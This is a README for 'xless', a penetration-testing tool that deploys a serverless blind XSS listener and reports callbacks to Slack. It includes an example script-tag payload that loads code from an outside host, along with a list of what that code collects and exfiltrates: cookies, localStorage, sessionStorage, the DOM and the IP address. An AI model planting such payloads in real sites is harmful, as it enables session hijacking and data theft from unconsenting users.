<h1 align="center">
  <br>
  <a href="https://github.com/mazen160/xless"><img src="https://user-images.githubusercontent.com/29874489/58731472-4f6c8080-83de-11e9-8206-992f4d777fdc.png" alt="Xless"></a>
  <br>
  xless
  <br>
</h1>

<h4 align="center">The Serverless Blind XSS App</h4>

<p align="center">
  <img src="https://img.shields.io/maintenance/yes/2019.svg?style=flat-square" alt="Maintained" />
  <img src="https://img.shields.io/bitbucket/issues-raw/mazen160/xless.svg?style=flat-square" alt="Issues" />
  <img src="https://img.shields.io/github/last-commit/mazen160/xless.svg?style=flat-square" alt="Last Commit" />
</p>

## :information_source: About The Project
**Xless** is a serverless Blind XSS (bXSS) application that can be used to identify Blind XSS vulnerabilities using your own deployed version of the application.  
There is no need to run a full deployment process; just setup a [zeit.co](https://zeit.co/) account and run `bash deploy.sh`.
That's it. You now have a fully-running Blind XSS listener that uses Slack to notify you for callbacks.

## :warning: Requirements
* [zeit.co](https://zeit.co/) account: zeit provides a **free plan** for serverless. If you use another provider for serverless, code changes should be minimal.
* Slack Incoming Webhook URL.


## :rocket: Deployment
1. Run `bash deploy.sh`

```bash
$ bash deploy.sh

> Deploying ~/xless under X
> https://xless.now.sh [v2] [in clipboard] [4s]
> Success! Deployment ready [4s]
```
2. Use the URL for blind XSS testing :fire:

**Xless will automatically serve the XSS payload, collect information, and exfiltrate it into your serverless app, which is then sent right to you in Slack.**


## :speech_balloon: Example Payload

```html
<script src="https://xless.now.sh"></script>
```


## :eyes: Demo
![Demo](https://raw.githubusercontent.com/mazen160/public/master/static/images/xless-screenshot.png)


## :incoming_envelope: Collected Data

* Cookies
* User-Agent
* HTTP Referrer
* Browser DOM
* Browser Time
* Document Location
* Origin
* LocalStorage
* SessionStorage
* IP Address

## :satellite: Out-of-Band (OOB) Callbacks Listener

Xless also works as an OOB (Out-of-Band) callbacks listener for HTTP/HTTPS requests. Any HTTP GET request that is sent to non-parent path will be alerted.

## :eyes: Demo

```bash
$ curl https://xless.now.sh/callback-canary
```

![OOB CallBack Listener Demo](https://raw.githubusercontent.com/mazen160/public/master/static/images/xless-screenshot-oob-callback-example.png)

Or anything random, such as:

```bash
$ curl https://xless.now.sh/88bf0ecd
```


##  Example Blind XSS payloads

You can view a number of handy XSS payloads for your xless app at `$URL/examples`
* URL: `https://xless.now.sh/examples`
Once you deploy your app, you can find the examples there.


## Contribution
Contribution is very welcome. Please share your ideas by Github issues and pull requests.

Here are some ideas to start with:
1. Enabling sharing of page screenshot - Check `test.payload.js`.
2. _Your idea of a new feature_?


## Acknowledgement

* [Matthew Bryant](https://github.com/mandatoryprogrammer) for the XSS Hunter project.
* [Rami Ahmed](https://twitter.com/rami_ahmad) for the "xless" name idea.
* [Damian Ebelties](https://twitter.com/DamianEbelties) for the logo.
* [Zeit.co](https://zeit.co/) for operating a great serverless platform.

## Awesome Similar Projects

* [Azure-xless](https://github.com/dgoumans/Azure-xless): An Xless implementation for Microsoft Azure Function by [Daan Goumans](https://twitter.com/daangoumans).


## Legal Disclaimer
This project is made for educational and ethical testing purposes only. Usage of xless for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.


## License
The project is currently licensed under MIT License.

## Author
*Mazin Ahmed*
* Website: [https://mazinahmed.net](https://mazinahmed.net)
* Email: mazin [at] mazinahmed [dot] net
* Twitter: [https://twitter.com/mazen160](https://twitter.com/mazen160)
* Linkedin: [http://linkedin.com/in/infosecmazinahmed](http://linkedin.com/in/infosecmazinahmed)
